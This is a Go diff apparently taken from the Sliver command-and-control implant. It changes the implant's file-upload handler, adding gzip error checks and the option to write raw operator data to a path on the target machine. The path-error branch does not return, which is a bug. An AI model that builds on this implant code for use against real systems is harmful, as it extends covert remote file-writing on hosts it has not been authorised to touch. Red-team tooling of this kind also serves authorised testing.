@@ -310,8 +310,17 @@ func uploadHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	uploadPath, _ := filepath.Abs(uploadReq.Path)
+	uploadPath, err := filepath.Abs(uploadReq.Path)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("upload path error: %v", err)
+		// {{end}}
+		resp([]byte{}, err)
+	}
+
+	// Process Upload
 	upload := &sliverpb.Upload{Path: uploadPath}
+
 	f, err := os.Create(uploadPath)
 	if err != nil {
 		upload.Response = &commonpb.Response{
@@ -319,14 +328,22 @@ func uploadHandler(data []byte, resp RPCResponse) {
 		}
 
 	} else {
+		// Create file, write data to file system
 		defer f.Close()
-		data, err := gzipRead(uploadReq.Data)
+		var uploadData []byte
+		var err error
+		if uploadReq.Encoder == "gzip" {
+			uploadData, err = gzipRead(uploadReq.Data)
+		} else {
+			uploadData = uploadReq.Data
+		}
+		// Check for decode errors
 		if err != nil {
 			upload.Response = &commonpb.Response{
 				Err: fmt.Sprintf("%v", err),
 			}
 		} else {
-			f.Write(data)
+			f.Write(uploadData)
 		}
 	}
 
@@ -629,9 +646,12 @@ func gzipWrite(w io.Writer, data []byte) error {
 
 func gzipRead(data []byte) ([]byte, error) {
 	bytes.NewReader(data)
-	reader, _ := gzip.NewReader(bytes.NewReader(data))
+	reader, err := gzip.NewReader(bytes.NewReader(data))
+	if err != nil {
+		return nil, err
+	}
 	var buf bytes.Buffer
-	_, err := buf.ReadFrom(reader)
+	_, err = buf.ReadFrom(reader)
 	if err != nil {
 		return nil, err
 	}
